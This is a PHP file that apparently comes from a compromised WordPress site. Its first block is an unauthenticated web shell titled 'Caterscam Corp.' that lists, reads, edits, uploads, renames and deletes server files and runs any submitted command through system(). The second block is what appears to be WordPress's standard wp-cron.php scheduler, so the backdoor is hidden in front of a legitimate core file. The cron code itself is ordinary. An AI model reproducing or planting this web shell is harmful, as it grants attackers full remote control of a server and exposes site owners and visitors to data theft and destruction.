<?php
error_reporting(0);

echo "<!DOCTYPE html>
<html>
<head>
    <title>Caterscam Corp.</title>
    <style>
        body { font-family: monospace; background-color: #f9f9f9; padding: 20px; }
        pre { font-size: 14px; }
        .cmd-section { margin-top: 20px; }
        .cmd-form { display: flex; gap: 10px; align-items: center; margin-bottom: 10px; }
        .cmd-form input[type='text'] { flex: 1; padding: 5px; font-family: monospace; font-size: 14px; }
        .cmd-form input[type='submit'] { padding: 5px 10px; }
        textarea { width: 100%; height: 200px; font-family: monospace; font-size: 14px; }
        a { text-decoration: none; color: #0645AD; }
        a.visited { color: #b58900 !important; font-weight: bold; }
    </style>
    <script>
        // Tambahkan kelas 'visited' jika sudah diklik sebelumnya
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelectorAll('a').forEach(function(link) {
                if (localStorage.getItem(link.href)) {
                    link.classList.add('visited');
                }

                link.addEventListener('click', function() {
                    localStorage.setItem(link.href, '1');
                });
            });
        });
    </script>
</head>
<body><pre>";

$cwd = realpath($_GET['path'] ?? getcwd());
if (!$cwd || !file_exists($cwd)) $cwd = getcwd();

// Handle delete
if (isset($_GET['del'])) {
    $target = realpath($_GET['del']);
    if (is_file($target)) {
        echo unlink($target) ? "[+] File deleted: $target\n" : "[-] Failed to delete file\n";
    } elseif (is_dir($target)) {
        echo rmdir($target) ? "[+] Directory deleted: $target\n" : "[-] Failed to delete directory\n";
    }
}

// Handle rename
if (isset($_GET['rename'], $_POST['newname'])) {
    $old = realpath($_GET['rename']);
    $new = dirname($old) . '/' . basename($_POST['newname']);
    echo rename($old, $new) ? "[+] Renamed to: $new\n" : "[-] Rename failed\n";
}

// Handle file save
if (isset($_GET['edit'], $_POST['content'])) {
    $file = $cwd . '/' . basename($_GET['edit']);
    echo file_put_contents($file, $_POST['content']) !== false ? "[+] File saved: $file\n" : "[-] Save failed\n";
}

// Handle file upload
if (isset($_POST["upload"]) && isset($_FILES["up"])) {
    $up = $_FILES["up"];
    $dest = $cwd . "/" . basename($up["name"]);
    echo move_uploaded_file($up["tmp_name"], $dest) ? "[+] Uploaded: " . $up["name"] . "\n" : "[-] Upload failed\n";
}

// Breadcrumb
echo "<b>Current Dir:</b> ";
$parts = explode("/", trim($cwd, "/"));
$build = "";
echo "<a href='?path=/'>/</a>";
foreach ($parts as $part) {
    $build .= "/" . $part;
    echo "<a href='?path=" . urlencode($build) . "'>$part</a>/";
}
echo "\n\n";

// Directory listing: pisahkan dir dan file
$files = scandir($cwd);
natcasesort($files);

$dirs = [];
$regularFiles = [];

foreach ($files as $f) {
    if ($f === "." || $f === "..") continue;
    $full = $cwd . '/' . $f;
    is_dir($full) ? $dirs[] = $f : $regularFiles[] = $f;
}

// Tampilkan direktori dulu
foreach ($dirs as $f) {
    $full = $cwd . '/' . $f;
    echo "[DIR]  <a href='?path=" . urlencode($full) . "'>$f</a> ";
    echo "[ <a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
}

// Lalu file
foreach ($regularFiles as $f) {
    $full = $cwd . '/' . $f;
    echo "[FILE] <a href='?path=" . urlencode($cwd) . "&read=" . urlencode($f) . "'>$f</a> ";
    echo "[ <a href='?path=" . urlencode($cwd) . "&edit=" . urlencode($f) . "'>edit</a> | ";
    echo "<a href='?del=" . urlencode($full) . "'>delete</a> | ";
    echo "<a href='?rename=" . urlencode($full) . "'>rename</a> ]\n";
}

// File viewer
if (isset($_GET['read'])) {
    $target = realpath($cwd . '/' . $_GET['read']);
    if ($target && is_file($target)) {
        echo "\n<b>Viewing:</b> " . htmlspecialchars($target) . "\n\n";
        echo htmlspecialchars(file_get_contents($target));
    }
}

// Edit form
if (isset($_GET['edit']) && !isset($_POST['content'])) {
    $file = $cwd . '/' . basename($_GET['edit']);
    $content = htmlspecialchars(@file_get_contents($file));
    echo "<form method='POST'>
    <textarea name='content'>$content</textarea><br>
    <input type='submit' value='Save'>
    </form>";
}

// Rename form
if (isset($_GET['rename']) && !isset($_POST['newname'])) {
    echo "<form method='POST'>
    Rename to: <input type='text' name='newname'>
    <input type='submit' value='Rename'>
    </form>";
}

// Upload form
echo "<br><form method='POST' enctype='multipart/form-data'>
<b>Upload File:</b> <input type='file' name='up'><input type='submit' name='upload' value='Upload'><br>
</form>";

// Command Execution
echo "<div class='cmd-section'>
<form method='POST' class='cmd-form'>
    <label><b>CMD:</b></label>
    <input type='text' name='cmd'>
    <input type='submit' value='Exec'>
</form>";

if (!empty($_POST["cmd"])) {
    echo "<div>
        <b>CMD Output:</b><br>
        <textarea readonly>";
    system($_POST["cmd"]);
    echo "</textarea></div>";
}

echo "</div></pre></body></html>";
?>


<?php
/**
 * A pseudo-cron daemon for scheduling WordPress tasks.
 *
 * WP-Cron is triggered when the site receives a visit. In the scenario
 * where a site may not receive enough visits to execute scheduled tasks
 * in a timely manner, this file can be called directly or via a server
 * cron daemon for X number of times.
 *
 * Defining DISABLE_WP_CRON as true and calling this file directly are
 * mutually exclusive and the latter does not rely on the former to work.
 *
 * The HTTP request to this file will not slow down the visitor who happens to
 * visit when a scheduled cron event runs.
 *
 * @package WordPress
 */

ignore_user_abort( true );

if ( ! headers_sent() ) {
	header( 'Expires: Wed, 11 Jan 1984 05:00:00 GMT' );
	header( 'Cache-Control: no-cache, must-revalidate, max-age=0' );
}

// Don't run cron until the request finishes, if possible.
if ( function_exists( 'fastcgi_finish_request' ) ) {
	fastcgi_finish_request();
} elseif ( function_exists( 'litespeed_finish_request' ) ) {
	litespeed_finish_request();
}

if ( ! empty( $_POST ) || defined( 'DOING_AJAX' ) || defined( 'DOING_CRON' ) ) {
	die();
}

/**
 * Tell WordPress the cron task is running.
 *
 * @var bool
 */
define( 'DOING_CRON', true );

if ( ! defined( 'ABSPATH' ) ) {
	/** Set up WordPress environment */
	require_once __DIR__ . '/wp-load.php';
}

// Attempt to raise the PHP memory limit for cron event processing.
wp_raise_memory_limit( 'cron' );

/**
 * Retrieves the cron lock.
 *
 * Returns the uncached `doing_cron` transient.
 *
 * @ignore
 * @since 3.3.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @return string|int|false Value of the `doing_cron` transient, 0|false otherwise.
 */
function _get_cron_lock() {
	global $wpdb;

	$value = 0;
	if ( wp_using_ext_object_cache() ) {
		/*
		 * Skip local cache and force re-fetch of doing_cron transient
		 * in case another process updated the cache.
		 */
		$value = wp_cache_get( 'doing_cron', 'transient', true );
	} else {
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT option_value FROM $wpdb->options WHERE option_name = %s LIMIT 1", '_transient_doing_cron' ) );
		if ( is_object( $row ) ) {
			$value = $row->option_value;
		}
	}

	return $value;
}

$crons = wp_get_ready_cron_jobs();
if ( empty( $crons ) ) {
	die();
}

$gmt_time = microtime( true );

// The cron lock: a unix timestamp from when the cron was spawned.
$doing_cron_transient = get_transient( 'doing_cron' );

// Use global $doing_wp_cron lock, otherwise use the GET lock. If no lock, try to grab a new lock.
if ( empty( $doing_wp_cron ) ) {
	if ( empty( $_GET['doing_wp_cron'] ) ) {
		// Called from external script/job. Try setting a lock.
		if ( $doing_cron_transient && ( $doing_cron_transient + WP_CRON_LOCK_TIMEOUT > $gmt_time ) ) {
			return;
		}
		$doing_wp_cron        = sprintf( '%.22F', microtime( true ) );
		$doing_cron_transient = $doing_wp_cron;
		set_transient( 'doing_cron', $doing_wp_cron );
	} else {
		$doing_wp_cron = $_GET['doing_wp_cron'];
	}
}

/*
 * The cron lock (a unix timestamp set when the cron was spawned),
 * must match $doing_wp_cron (the "key").
 */
if ( $doing_cron_transient !== $doing_wp_cron ) {
	return;
}

foreach ( $crons as $timestamp => $cronhooks ) {
	if ( $timestamp > $gmt_time ) {
		break;
	}

	foreach ( $cronhooks as $hook => $keys ) {

		foreach ( $keys as $k => $v ) {

			$schedule = $v['schedule'];

			if ( $schedule ) {
				$result = wp_reschedule_event( $timestamp, $schedule, $hook, $v['args'], true );

				if ( is_wp_error( $result ) ) {
					error_log(
						sprintf(
							/* translators: 1: Hook name, 2: Error code, 3: Error message, 4: Event data. */
							__( 'Cron reschedule event error for hook: %1$s, Error code: %2$s, Error message: %3$s, Data: %4$s' ),
							$hook,
							$result->get_error_code(),
							$result->get_error_message(),
							wp_json_encode( $v )
						)
					);

					/**
					 * Fires if an error happens when rescheduling a cron event.
					 *
					 * @since 6.1.0
					 *
					 * @param WP_Error $result The WP_Error object.
					 * @param string   $hook   Action hook to execute when the event is run.
					 * @param array    $v      Event data.
					 */
					do_action( 'cron_reschedule_event_error', $result, $hook, $v );
				}
			}

			$result = wp_unschedule_event( $timestamp, $hook, $v['args'], true );

			if ( is_wp_error( $result ) ) {
				error_log(
					sprintf(
						/* translators: 1: Hook name, 2: Error code, 3: Error message, 4: Event data. */
						__( 'Cron unschedule event error for hook: %1$s, Error code: %2$s, Error message: %3$s, Data: %4$s' ),
						$hook,
						$result->get_error_code(),
						$result->get_error_message(),
						wp_json_encode( $v )
					)
				);

				/**
				 * Fires if an error happens when unscheduling a cron event.
				 *
				 * @since 6.1.0
				 *
				 * @param WP_Error $result The WP_Error object.
				 * @param string   $hook   Action hook to execute when the event is run.
				 * @param array    $v      Event data.
				 */
				do_action( 'cron_unschedule_event_error', $result, $hook, $v );
			}

			/**
			 * Fires scheduled events.
			 *
			 * @ignore
			 * @since 2.1.0
			 *
			 * @param string $hook Name of the hook that was scheduled to be fired.
			 * @param array  $args The arguments to be passed to the hook.
			 */
			do_action_ref_array( $hook, $v['args'] );

			// If the hook ran too long and another cron process stole the lock, quit.
			if ( _get_cron_lock() !== $doing_wp_cron ) {
				return;
			}
		}
	}
}

if ( _get_cron_lock() === $doing_wp_cron ) {
	delete_transient( 'doing_cron' );
}

die();